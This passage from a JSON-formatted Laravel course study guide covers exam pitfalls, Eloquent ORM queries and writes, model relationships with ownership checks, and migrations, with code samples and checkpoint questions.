\u003ccode\u003e-&gt;get()\u003c/code\u003e after \u003ccode\u003eall()\u003c/code\u003e. \u003ccode\u003eUser::all()-&gt;get()\u003c/code\u003e is wrong. \u003ccode\u003eUser::find()\u003c/code\u003e retrieves one record by primary key.\u003c/p\u003e","text":"**Eloquent `all()` vs method chaining** (final-practice.docx Q9). `User::all()` retrieves every record. `User::get()` retrieves the collection from a query builder — you do NOT chain `-\u003eget()` after `all()`. `User::all()-\u003eget()` is wrong. `User::find()` retrieves one record by primary key."},{"kind":"h2","html":"Additional traps (sourced from slides)","text":"Additional traps (sourced from slides)"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eJWT reserved claims — all 7\u003c/strong\u003e (PHP_JWT.pptx slide 8). The seven reserved claims are \u003ccode\u003eiat\u003c/code\u003e, \u003ccode\u003eiss\u003c/code\u003e, \u003ccode\u003enbf\u003c/code\u003e, \u003ccode\u003eexp\u003c/code\u003e, \u003ccode\u003esub\u003c/code\u003e, \u003ccode\u003eaud\u003c/code\u003e, \u003ccode\u003ejti\u003c/code\u003e. Questions may ask you to identify which is a reserved claim or what each means: \u003ccode\u003eiat\u003c/code\u003e=issued-at, \u003ccode\u003eexp\u003c/code\u003e=expiration, \u003ccode\u003esub\u003c/code\u003e=subject, \u003ccode\u003eiss\u003c/code\u003e=issuer, \u003ccode\u003eaud\u003c/code\u003e=audience, \u003ccode\u003enbf\u003c/code\u003e=not-before, \u003ccode\u003ejti\u003c/code\u003e=JWT ID.\u003c/p\u003e","text":"**JWT reserved claims — all 7** (PHP_JWT.pptx slide 8). The seven reserved claims are `iat`, `iss`, `nbf`, `exp`, `sub`, `aud`, `jti`. Questions may ask you to identify which is a reserved claim or what each means: `iat`=issued-at, `exp`=expiration, `sub`=subject, `iss`=issuer, `aud`=audience, `nbf`=not-before, `jti`=JWT ID."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eOpenAPI ≠ Swagger\u003c/strong\u003e (swagger-with-laravel.pptx slide 2). OpenAPI is the \u003cstrong\u003especification language\u003c/strong\u003e (the JSON/YAML contract). Swagger is the \u003cstrong\u003etoolset\u003c/strong\u003e (UI, Editor, Codegen). Exam questions that ask &quot;what is OpenAPI?&quot; expect the specification answer, not &quot;a tool for documenting APIs.&quot;\u003c/p\u003e","text":"**OpenAPI ≠ Swagger** (swagger-with-laravel.pptx slide 2). OpenAPI is the **specification language** (the JSON/YAML contract). Swagger is the **toolset** (UI, Editor, Codegen). Exam questions that ask \"what is OpenAPI?\" expect the specification answer, not \"a tool for documenting APIs.\""},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e$fillable\u003c/code\u003e required for mass assignment\u003c/strong\u003e (laravel_with_sqlite_API_SCRIPT.docx). If you call \u003ccode\u003eModel::create($request-&gt;all())\u003c/code\u003e without defining \u003ccode\u003e$fillable\u003c/code\u003e on the model, Laravel throws a \u003ccode\u003eMassAssignmentException\u003c/code\u003e. The fix: add \u003ccode\u003eprotected $fillable = [&#39;field1&#39;, &#39;field2&#39;]\u003c/code\u003e to the model class.\u003c/p\u003e","text":"**`$fillable` required for mass assignment** (laravel_with_sqlite_API_SCRIPT.docx). If you call `Model::create($request-\u003eall())` without defining `$fillable` on the model, Laravel throws a `MassAssignmentException`. The fix: add `protected $fillable = ['field1', 'field2']` to the model class."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eRoute cache invalidation\u003c/strong\u003e (laravel_with_sqlite_API_SCRIPT.docx). After adding or changing routes that use auth middleware, run \u003ccode\u003ephp artisan route:clear\u003c/code\u003e and \u003ccode\u003ephp artisan cache:clear\u003c/code\u003e. Stale caches silently serve old route definitions — protected routes appear to have no auth.\u003c/p\u003e","text":"**Route cache invalidation** (laravel_with_sqlite_API_SCRIPT.docx). After adding or changing routes that use auth middleware, run `php artisan route:clear` and `php artisan cache:clear`. Stale caches silently serve old route definitions — protected routes appear to have no auth."},{"kind":"h2","html":"Off-by-one / unit / ordering traps","text":"Off-by-one / unit / ordering traps"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eJWT structure is \u003cstrong\u003ethree\u003c/strong\u003e parts (\u003ccode\u003eheader.payload.signature\u003c/code\u003e), not two. All three are base64-encoded.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan make:model Student -m\u003c/code\u003e creates \u003cstrong\u003eboth\u003c/strong\u003e the model \u003cstrong\u003eand\u003c/strong\u003e the migration. Omitting \u003ccode\u003e-m\u003c/code\u003e creates only the model — no migration.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan migrate:refresh --seed\u003c/code\u003e \u003cstrong\u003edrops and recreates\u003c/strong\u003e all tables. Running it in production destroys data. The \u003ccode\u003e--force\u003c/code\u003e flag is required to run it in a non-local environment.\u003c/li\u003e\n\u003cli\u003eBreeze installs \u003cstrong\u003eTailwind CSS\u003c/strong\u003e (not Bootstrap). Questions that conflate Bootstrap with Breeze test this distinction.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003edarkaonline/l5-swagger\u003c/code\u003e package requires \u003ccode\u003e-W\u003c/code\u003e flag: \u003ccode\u003ecomposer require darkaonline/l5-swagger -W\u003c/code\u003e. Omitting \u003ccode\u003e-W\u003c/code\u003e causes a dependency conflict on many Laravel versions.\u003c/li\u003e\n\u003c/ul\u003e","text":"- JWT structure is **three** parts (`header.payload.signature`), not two. All three are base64-encoded.\n- `php artisan make:model Student -m` creates **both** the model **and** the migration. Omitting `-m` creates only the model — no migration.\n- `php artisan migrate:refresh --seed` **drops and recreates** all tables. Running it in production destroys data. The `--force` flag is required to run it in a non-local environment.\n- Breeze installs **Tailwind CSS** (not Bootstrap). Questions that conflate Bootstrap with Breeze test this distinction.\n- The `darkaonline/l5-swagger` package requires `-W` flag: `composer require darkaonline/l5-swagger -W`. Omitting `-W` causes a dependency conflict on many Laravel versions."},{"kind":"checkpoint","q":"You have 90 seconds left and 8 questions remaining on the multiple-choice section. Which do you attempt first?","a":"Attempt the questions you can answer in under 10 seconds — recall-level items about specific facts (command names, directory paths, HTTP status codes). Skip any question requiring reasoning about an unfamiliar scenario; guess on remaining blanks in the last 10 seconds."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eThe exam rewards exact command syntax and precise package/concept names over general understanding. Build your cheat sheet around Artisan command names, JWT claim names, and the OpenAPI/Swagger distinction — these are the highest-density, highest-error areas from the practice exam.\u003c/p\u003e","text":"The exam rewards exact command syntax and precise package/concept names over general understanding. Build your cheat sheet around Artisan command names, JWT claim names, and the OpenAPI/Swagger distinction — these are the highest-density, highest-error areas from the practice exam."}]},{"n":1,"id":"eloquent-orm","title":"Eloquent ORM — querying and persisting data","hook":"One method call fetches every row. Another persists a new one. Here is how Eloquent makes database work feel like PHP.","tags":["eloquent","orm","laravel","database","crud"],"module":"Laravel Database","source":"laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx","blocks":[{"kind":"h2","html":"A concrete starting point","text":"A concrete starting point"},{"kind":"p","html":"You have a \u003ccode\u003estudents\u003c/code\u003e table in your database. You want every row as a PHP object.","text":"You have a `students` table in your database. You want every row as a PHP object."},{"kind":"code","lang":"php","code":"$students = Student::all();"},{"kind":"p","html":"That one line returns an Eloquent Collection — a PHP array-like object where each element is a \u003ccode\u003eStudent\u003c/code\u003e model instance with properties like \u003ccode\u003e$student-&gt;FirstName\u003c/code\u003e and \u003ccode\u003e$student-&gt;School\u003c/code\u003e.","text":"That one line returns an Eloquent Collection — a PHP array-like object where each element is a `Student` model instance with properties like `$student-\u003eFirstName` and `$student-\u003eSchool`."},{"kind":"p","html":"This is Eloquent ORM. You work with PHP objects. Eloquent translates your method calls into SQL behind the scenes.","text":"This is Eloquent ORM. You work with PHP objects. Eloquent translates your method calls into SQL behind the scenes."},{"kind":"checkpoint","q":"What does `Student::all()` return — a plain PHP array or an Eloquent Collection?","a":"An Eloquent Collection. Each element is a `Student` model instance, not a raw array. You access columns as object properties, e.g. `$student-\u003eFirstName`."},{"kind":"h2","html":"What Eloquent ORM is","text":"What Eloquent ORM is"},{"kind":"p","html":"Eloquent ORM is Laravel&#39;s object-relational mapper. It maps each database table to a PHP class called a \u003cstrong\u003emodel\u003c/strong\u003e. Laravel follows a naming convention: a \u003ccode\u003eStudent\u003c/code\u003e model maps to the \u003ccode\u003estudents\u003c/code\u003e table by default.","text":"Eloquent ORM is Laravel's object-relational mapper. It maps each database table to a PHP class called a **model**. Laravel follows a naming convention: a `Student` model maps to the `students` table by default."},{"kind":"p","html":"You create the model with Artisan:","text":"You create the model with Artisan:"},{"kind":"code","lang":"bash","code":"php artisan make:model Student -m"},{"kind":"p","html":"The \u003ccode\u003e-m\u003c/code\u003e flag generates a migration alongside the model. The model file lives in \u003ccode\u003eapp/Models/Student.php\u003c/code\u003e.","text":"The `-m` flag generates a migration alongside the model. The model file lives in `app/Models/Student.php`."},{"kind":"p","html":"The default \u003ccode\u003eStudent.php\u003c/code\u003e looks like this:","text":"The default `Student.php` looks like this:"},{"kind":"code","lang":"php","code":"\u003c?php\n\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Student extends Model\n{\n    //\n}"},{"kind":"p","html":"That empty class already inherits \u003ccode\u003eall()\u003c/code\u003e, \u003ccode\u003efind()\u003c/code\u003e, \u003ccode\u003efindOrFail()\u003c/code\u003e, \u003ccode\u003ecreate()\u003c/code\u003e, \u003ccode\u003esave()\u003c/code\u003e, \u003ccode\u003eupdate()\u003c/code\u003e, and \u003ccode\u003edelete()\u003c/code\u003e from the \u003ccode\u003eModel\u003c/code\u003e base class.","text":"That empty class already inherits `all()`, `find()`, `findOrFail()`, `create()`, `save()`, `update()`, and `delete()` from the `Model` base class."},{"kind":"h2","html":"Reading data","text":"Reading data"},{"kind":"h3","html":"Fetch all rows","text":"Fetch all rows"},{"kind":"code","lang":"php","code":"$students = Student::all();"},{"kind":"p","html":"Use this when you need every row. For large tables, use \u003ccode\u003epaginate()\u003c/code\u003e instead.","text":"Use this when you need every row. For large tables, use `paginate()` instead."},{"kind":"h3","html":"Fetch one row by primary key","text":"Fetch one row by primary key"},{"kind":"code","lang":"php","code":"$student = Student::find($id);"},{"kind":"p","html":"\u003ccode\u003efind()\u003c/code\u003e returns \u003ccode\u003enull\u003c/code\u003e if the record does not exist. Use \u003ccode\u003efindOrFail()\u003c/code\u003e when a missing record should produce a 404:","text":"`find()` returns `null` if the record does not exist. Use `findOrFail()` when a missing record should produce a 404:"},{"kind":"code","lang":"php","code":"$student = Student::findOrFail($id);"},{"kind":"p","html":"\u003ccode\u003efindOrFail()\u003c/code\u003e throws a \u003ccode\u003eModelNotFoundException\u003c/code\u003e, which Laravel automatically converts to a 404 HTTP response.","text":"`findOrFail()` throws a `ModelNotFoundException`, which Laravel automatically converts to a 404 HTTP response."},{"kind":"h3","html":"Filtered queries","text":"Filtered queries"},{"kind":"p","html":"Eloquent queries chain builder methods just like Query Builder, but you call them on the model class:","text":"Eloquent queries chain builder methods just like Query Builder, but you call them on the model class:"},{"kind":"code","lang":"php","code":"$students = Student::select(['FirstName', 'LastName', 'School'])\n    -\u003ewhereNotNull('School')\n    -\u003ewhere('FirstName', 'LIKE', 'A%')\n    -\u003eorderBy('FirstName')\n    -\u003eget();"},{"kind":"p","html":"Note the \u003ccode\u003e-&gt;get()\u003c/code\u003e at the end. Builder chains require \u003ccode\u003e-&gt;get()\u003c/code\u003e to execute and return results. \u003ccode\u003eStudent::all()\u003c/code\u003e is a shorthand that does not accept chained constraints — it always fetches all rows.","text":"Note the `-\u003eget()` at the end. Builder chains require `-\u003eget()` to execute and return results. `Student::all()` is a shorthand that does not accept chained constraints — it always fetches all rows."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e \u003ccode\u003eStudent::all()-&gt;where(...)\u003c/code\u003e does NOT filter at the database level. \u003ccode\u003eall()\u003c/code\u003e fetches every row into memory first, then \u003ccode\u003ewhere()\u003c/code\u003e filters in PHP. For any filtered query, start with \u003ccode\u003eStudent::where(...)\u003c/code\u003e and end with \u003ccode\u003e-&gt;get()\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Writing data","text":"Writing data"},{"kind":"h3","html":"Insert a new record (property-by-property)","text":"Insert a new record (property-by-property)"},{"kind":"code","lang":"php","code":"$student = new Student();\n$student-\u003eFirstName = 'Jane';\n$student-\u003eLastName = 'Bond';\n$student-\u003eSchool = 'International Espionage';\n$student-\u003esave();"},{"kind":"p","html":"You instantiate the model, assign properties, then call \u003ccode\u003esave()\u003c/code\u003e. Laravel builds and executes an \u003ccode\u003eINSERT\u003c/code\u003e statement.","text":"You instantiate the model, assign properties, then call `save()`. Laravel builds and executes an `INSERT` statement."},{"kind":"h3","html":"Insert with mass assignment","text":"Insert with mass assignment"},{"kind":"code","lang":"php","code":"Student::create([\n    'FirstName' =\u003e request('FirstName'),\n    'LastName'  =\u003e request('LastName'),\n    'School'    =\u003e request('School'),\n]);"},{"kind":"p","html":"\u003ccode\u003ecreate()\u003c/code\u003e is a one-call shorthand. It accepts an associative array and inserts in one step.","text":"`create()` is a one-call shorthand. It accepts an associative array and inserts in one step."},{"kind":"p","html":"\u003cstrong\u003eMass assignment requires \u003ccode\u003e$fillable\u003c/code\u003e.\u003c/strong\u003e Before \u003ccode\u003ecreate()\u003c/code\u003e will work, you must declare which fields are allowed:","text":"**Mass assignment requires `$fillable`.** Before `create()` will work, you must declare which fields are allowed:"},{"kind":"code","lang":"php","code":"protected $fillable = [\n    'FirstName',\n    'LastName',\n    'School',\n];"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Calling \u003ccode\u003eStudent::create($request-&gt;all())\u003c/code\u003e without \u003ccode\u003e$fillable\u003c/code\u003e throws a \u003ccode\u003eMassAssignmentException\u003c/code\u003e. Laravel blocks mass assignment by default to prevent attackers from setting fields like \u003ccode\u003eis_admin\u003c/code\u003e via a crafted POST body. The \u003ccode\u003e$fillable\u003c/code\u003e array is your whitelist — list only the fields users are permitted to set.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h3","html":"Update a record","text":"Update a record"},{"kind":"code","lang":"php","code":"$student = Student::findOrFail($id);\n$student-\u003eFirstName = $request-\u003eget('FirstName');\n$student-\u003eLastName  = $request-\u003eget('LastName');\n$student-\u003eSchool    = $request-\u003eget('School');\n$student-\u003esave();"},{"kind":"p","html":"Alternatively, use the \u003ccode\u003eupdate()\u003c/code\u003e method with an array (also requires \u003ccode\u003e$fillable\u003c/code\u003e):","text":"Alternatively, use the `update()` method with an array (also requires `$fillable`):"},{"kind":"code","lang":"php","code":"$student-\u003eupdate([\n    'FirstName' =\u003e request('FirstName'),\n    'LastName'  =\u003e request('LastName'),\n    'School'    =\u003e request('School'),\n]);"},{"kind":"h3","html":"Delete a record","text":"Delete a record"},{"kind":"code","lang":"php","code":"$student = Student::find($id);\n$student-\u003edelete();"},{"kind":"h2","html":"Validation before writing","text":"Validation before writing"},{"kind":"p","html":"Always validate user input before persisting it:","text":"Always validate user input before persisting it:"},{"kind":"code","lang":"php","code":"$request-\u003evalidate([\n    'FirstName' =\u003e 'required',\n    'LastName'  =\u003e 'required',\n    'School'    =\u003e 'required',\n]);"},{"kind":"p","html":"Laravel returns validation errors automatically. Invalid requests never reach \u003ccode\u003ecreate()\u003c/code\u003e or \u003ccode\u003esave()\u003c/code\u003e.","text":"Laravel returns validation errors automatically. Invalid requests never reach `create()` or `save()`."},{"kind":"h2","html":"Eloquent vs Query Builder vs raw SQL","text":"Eloquent vs Query Builder vs raw SQL"},{"kind":"p","html":"The standard Laravel data-access hierarchy is:","text":"The standard Laravel data-access hierarchy is:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ePattern\u003c/th\u003e\n\u003cth\u003eSyntax\u003c/th\u003e\n\u003cth\u003eWhen to use\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eEloquent ORM\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eStudent::all()\u003c/code\u003e / \u003ccode\u003eStudent::create()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eDefault — clean, testable, model-level\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eQuery Builder\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eDB::table(&#39;students&#39;)-&gt;select()-&gt;get()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eComplex queries Eloquent cannot express cleanly\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRaw SQL\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eDB::select(&#39;SELECT * FROM students&#39;)\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eLast resort — vendor-specific SQL, performance tuning\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"checkpoint","q":"Your controller needs students whose `School` is not null, sorted by `FirstName`. Which Eloquent chain do you write?","a":"`Student::whereNotNull('School')-\u003eorderBy('FirstName')-\u003eget()` — chain builder methods on the model class and terminate with `-\u003eget()`."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e \u003ccode\u003eStudent::all()-&gt;where(...)\u003c/code\u003e loads every row into PHP memory before filtering. For any server-side filter, use \u003ccode\u003eStudent::where(...)-&gt;get()\u003c/code\u003e so the database does the work. This exact pattern appeared on the past exam as a distractor.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Eloquent ORM maps your PHP model to a database table. You read with \u003ccode\u003eall()\u003c/code\u003e, \u003ccode\u003efind()\u003c/code\u003e, \u003ccode\u003efindOrFail()\u003c/code\u003e, and builder chains ending in \u003ccode\u003e-&gt;get()\u003c/code\u003e. You write with property assignment plus \u003ccode\u003esave()\u003c/code\u003e, or with \u003ccode\u003ecreate()\u003c/code\u003e backed by a \u003ccode\u003e$fillable\u003c/code\u003e array. The \u003ccode\u003e$fillable\u003c/code\u003e whitelist is not optional — it is the guard between user input and your database schema.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":2,"id":"model-relationships","title":"Eloquent relationships — hasMany and belongsTo","hook":"One foreign key, two model methods — and you never write a JOIN again.","tags":["eloquent","relationships","hasMany","belongsTo","laravel"],"module":"Laravel Database","source":"laravel_with_students_MySQL_SCRIPT.docx; auth-with-breeze_SQLite_SCRIPT.docx","blocks":[{"kind":"h2","html":"The concrete case: User owns many Orgs","text":"The concrete case: User owns many Orgs"},{"kind":"p","html":"In the Breeze org-registry app, each authenticated user creates organizations. One user can own many orgs. Each org belongs to exactly one user. The \u003ccode\u003eorgs\u003c/code\u003e table has a \u003ccode\u003euser_id\u003c/code\u003e foreign key column that records this ownership.","text":"In the Breeze org-registry app, each authenticated user creates organizations. One user can own many orgs. Each org belongs to exactly one user. The `orgs` table has a `user_id` foreign key column that records this ownership."},{"kind":"p","html":"Without Eloquent relationships, you query orgs like this:","text":"Without Eloquent relationships, you query orgs like this:"},{"kind":"code","lang":"php","code":"$orgs = Org::where('user_id', Auth::id())-\u003elatest('updated_at')-\u003eget();"},{"kind":"p","html":"That works, but it hard-codes the foreign key name every time you need it. Eloquent relationships let you express the same intent through the model graph instead.","text":"That works, but it hard-codes the foreign key name every time you need it. Eloquent relationships let you express the same intent through the model graph instead."},{"kind":"h2","html":"Declaring the relationship","text":"Declaring the relationship"},{"kind":"p","html":"You declare a one-to-many relationship in two model files — one for each side.","text":"You declare a one-to-many relationship in two model files — one for each side."},{"kind":"p","html":"\u003cstrong\u003eParent side — \u003ccode\u003eUser\u003c/code\u003e hasMany \u003ccode\u003eOrg\u003c/code\u003e.\u003c/strong\u003e\nOpen \u003ccode\u003eapp/Models/User.php\u003c/code\u003e and add:","text":"**Parent side — `User` hasMany `Org`.**\nOpen `app/Models/User.php` and add:"},{"kind":"code","lang":"php","code":"public function orgs() {\n    return $this-\u003ehasMany(Org::class);\n}"},{"kind":"p","html":"\u003cstrong\u003eChild side — \u003ccode\u003eOrg\u003c/code\u003e belongsTo \u003ccode\u003eUser\u003c/code\u003e.\u003c/strong\u003e\nOpen \u003ccode\u003eapp/Models/Org.php\u003c/code\u003e and add:","text":"**Child side — `Org` belongsTo `User`.**\nOpen `app/Models/Org.php` and add:"},{"kind":"code","lang":"php","code":"public function user() {\n    return $this-\u003ebelongsTo(User::class);\n}"},{"kind":"p","html":"The method name on the child side (\u003ccode\u003euser\u003c/code\u003e) is singular. The method name on the parent side (\u003ccode\u003eorgs\u003c/code\u003e) is plural. That naming convention tells you which side of the relationship you are on.","text":"The method name on the child side (`user`) is singular. The method name on the parent side (`orgs`) is plural. That naming convention tells you which side of the relationship you are on."},{"kind":"checkpoint","q":"After adding `hasMany` and `belongsTo`, what single change lets the `index()` controller method use the relationship instead of a raw `where` clause?","a":"Replace `Org::where('user_id', Auth::id())-\u003e...-\u003eget()` with `Auth::user()-\u003eorgs()-\u003e...-\u003eget()`. The relationship method replaces the manual foreign-key filter."},{"kind":"h2","html":"Querying through the relationship","text":"Querying through the relationship"},{"kind":"p","html":"Once the methods exist, you have three equivalent ways to fetch the current user&#39;s orgs:","text":"Once the methods exist, you have three equivalent ways to fetch the current user's orgs:"},{"kind":"code","lang":"php","code":"// Option 1 — manual where (no relationship needed)\n$orgs = Org::where('user_id', Auth::id())-\u003elatest('updated_at')-\u003eget();\n\n// Option 2 — relationship chain via Auth facade\n$orgs = Auth::user()-\u003eorgs()-\u003elatest('updated_at')-\u003eget();\n\n// Option 3 — whereBelongsTo() shorthand\n$orgs = Org::whereBelongsTo(Auth::user())-\u003elatest('updated_at')-\u003eget();"},{"kind":"p","html":"All three produce the same SQL. Options 2 and 3 require the relationship methods to be declared on the models.","text":"All three produce the same SQL. Options 2 and 3 require the relationship methods to be declared on the models."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eThe \u003ccode\u003eorgs\u003c/code\u003e table \u003cstrong\u003emust\u003c/strong\u003e have a \u003ccode\u003euser_id\u003c/code\u003e column for \u003ccode\u003ehasMany(Org::class)\u003c/code\u003e to work. Eloquent infers the foreign key name by taking the parent model name (\u003ccode\u003eUser\u003c/code\u003e), lowercasing it, and appending \u003ccode\u003e_id\u003c/code\u003e. If your migration omits \u003ccode\u003e$table-&gt;foreignId(&#39;user_id&#39;)-&gt;constrained()\u003c/code\u003e, every relationship query silently returns an empty result — no error, just zero rows.\u003c/p\u003e","text":"The `orgs` table **must** have a `user_id` column for `hasMany(Org::class)` to work. Eloquent infers the foreign key name by taking the parent model name (`User`), lowercasing it, and appending `_id`. If your migration omits `$table-\u003eforeignId('user_id')-\u003econstrained()`, every relationship query silently returns an empty result — no error, just zero rows."},{"kind":"h2","html":"Saving through the relationship","text":"Saving through the relationship"},{"kind":"p","html":"When a logged-in user creates a new org, you can attach it directly through the relationship. This automatically sets \u003ccode\u003euser_id\u003c/code\u003e for you:","text":"When a logged-in user creates a new org, you can attach it directly through the relationship. This automatically sets `user_id` for you:"},{"kind":"code","lang":"php","code":"Auth::user()-\u003eorgs()-\u003ecreate([\n    'orgName'    =\u003e $request-\u003eorgName,\n    'street'     =\u003e $request-\u003estreet,\n    'city'       =\u003e $request-\u003ecity,\n    'postalCode' =\u003e $request-\u003epostalCode,\n    'province'   =\u003e $request-\u003eprovince,\n    'country'    =\u003e $request-\u003ecountry,\n    'phone'      =\u003e $request-\u003ephone,\n    'email'      =\u003e $request-\u003eemail,\n]);"},{"kind":"p","html":"You do not pass \u003ccode\u003euser_id\u003c/code\u003e explicitly. The relationship sets it.","text":"You do not pass `user_id` explicitly. The relationship sets it."},{"kind":"p","html":"Note that \u003ccode\u003e$fillable\u003c/code\u003e on \u003ccode\u003eOrg\u003c/code\u003e must list every attribute you pass here. Without it, Eloquent&#39;s mass assignment protection blocks the \u003ccode\u003ecreate()\u003c/code\u003e call entirely.","text":"Note that `$fillable` on `Org` must list every attribute you pass here. Without it, Eloquent's mass assignment protection blocks the `create()` call entirely."},{"kind":"h2","html":"Checking ownership","text":"Checking ownership"},{"kind":"p","html":"When showing or editing a single org, you must verify the current user owns it. Use the \u003ccode\u003ebelongsTo\u003c/code\u003e relationship to traverse from the child to its parent:","text":"When showing or editing a single org, you must verify the current user owns it. Use the `belongsTo` relationship to traverse from the child to its parent:"},{"kind":"code","lang":"php","code":"public function show(Org $org) {\n    if (!$org-\u003euser-\u003eis(Auth::user())) {\n        return abort(403);\n    }\n    return view('orgs.show')-\u003ewith('org', $org);\n}"},{"kind":"p","html":"\u003ccode\u003e$org-&gt;user\u003c/code\u003e returns the related \u003ccode\u003eUser\u003c/code\u003e model (using \u003ccode\u003ebelongsTo\u003c/code\u003e). The \u003ccode\u003eis()\u003c/code\u003e method compares models by primary key. This pattern prevents one authenticated user from viewing another user&#39;s orgs.","text":"`$org-\u003euser` returns the related `User` model (using `belongsTo`). The `is()` method compares models by primary key. This pattern prevents one authenticated user from viewing another user's orgs."},{"kind":"checkpoint","q":"What does `$org-\u003euser-\u003eis(Auth::user())` return if the org belongs to a different user?","a":"It returns `false`. The `is()` method compares the two models' primary key values. When they differ, the check fails and `abort(403)` fires."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003e\u003ccode\u003ehasMany\u003c/code\u003e and \u003ccode\u003ebelongsTo\u003c/code\u003e are declared once per model and replace every manual \u003ccode\u003eWHERE user_id = ?\u003c/code\u003e filter in your controllers. They also power \u003ccode\u003ewhereBelongsTo()\u003c/code\u003e and \u003ccode\u003e-&gt;create()\u003c/code\u003e through the relationship, keeping foreign key logic out of your controller code entirely.\u003c/p\u003e","text":"`hasMany` and `belongsTo` are declared once per model and replace every manual `WHERE user_id = ?` filter in your controllers. They also power `whereBelongsTo()` and `-\u003ecreate()` through the relationship, keeping foreign key logic out of your controller code entirely."}]},{"n":3,"id":"migrations-and-seeders","title":"Migrations and seeders — versioning your schema","hook":"One command wipes your database and repopulates it with clean sample data.","tags":["laravel","migrations","seeders","database-schema"],"module":"Laravel Database","source":"laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx","blocks":[{"kind":"h2","html":"A migration in 60 seconds","text":"A migration in 60 seconds"},{"kind":"p","html":"Run this command and you immediately get two files at once:","text":"Run this command and you immediately get two files at once:"},{"kind":"code","lang":"bash","code":"php artisan make:model Student -m"},{"kind":"p","html":"The \u003ccode\u003e-m\u003c/code\u003e flag tells Artisan to create a migration alongside the model. You find the new migration in \u003ccode\u003edatabase/migrations/\u003c/code\u003e, named with a timestamp like \u003ccode\u003e2022_03_19_180928_create_students_table.php\u003c/code\u003e.","text":"The `-m` flag tells Artisan to create a migration alongside the model. You find the new migration in `database/migrations/`, named with a timestamp like `2022_03_19_180928_create_students_table.php`."},{"kind":"p","html":"Open that file and you see two methods: \u003ccode\u003eup()\u003c/code\u003e and \u003ccode\u003edown()\u003c/code\u003e. The \u003ccode\u003eup()\u003c/code\u003e method defines what to build; \u003ccode\u003edown()\u003c/code\u003e defines how to undo it.","text":"Open that file and you see two methods: `up()` and `down()`. The `up()` method defines what to build; `down()` defines how to undo it."},{"kind":"code","lang":"php","code":"public function up()\n{\n    Schema::create('students', function (Blueprint $table) {\n        $table-\u003eid();\n        $table-\u003estring('FirstName');\n        $table-\u003estring('LastName');\n        $table-\u003estring('School');\n        $table-\u003etimestamps();\n    });\n}\n\npublic function down()\n{\n    Schema::dropIfExists('students');\n}"},{"kind":"p","html":"To apply every pending migration:","text":"To apply every pending migration:"},{"kind":"code","lang":"bash","code":"php artisan migrate"},{"kind":"p","html":"Laravel runs each un-applied migration file in timestamp order and creates the table in your database.","text":"Laravel runs each un-applied migration file in timestamp order and creates the table in your database."},{"kind":"checkpoint","q":"What does the `-m` flag do when you run `php artisan make:model Student -m`?","a":"It creates a migration file in `database/migrations/` at the same time as the model file — you get both with one command."},{"kind":"h2","html":"What a migration file actually does","text":"What a migration file actually does"},{"kind":"p","html":"A migration is a PHP class with \u003ccode\u003eup()\u003c/code\u003e and \u003ccode\u003edown()\u003c/code\u003e methods. The \u003ccode\u003eup()\u003c/code\u003e method calls \u003ccode\u003eSchema::create()\u003c/code\u003e or \u003ccode\u003eSchema::table()\u003c/code\u003e to build or alter a table. The \u003ccode\u003edown()\u003c/code\u003e method reverses it — usually with \u003ccode\u003eSchema::dropIfExists()\u003c/code\u003e.","text":"A migration is a PHP class with `up()` and `down()` methods. The `up()` method calls `Schema::create()` or `Schema::table()` to build or alter a table. The `down()` method reverses it — usually with `Schema::dropIfExists()`."},{"kind":"p","html":"The \u003ccode\u003e$table-&gt;\u003c/code\u003e builder methods map directly to SQL column types:","text":"The `$table-\u003e` builder methods map directly to SQL column types:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMethod\u003c/th\u003e\n\u003cth\u003eColumn type\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e$table-&gt;id()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAuto-increment bigint primary 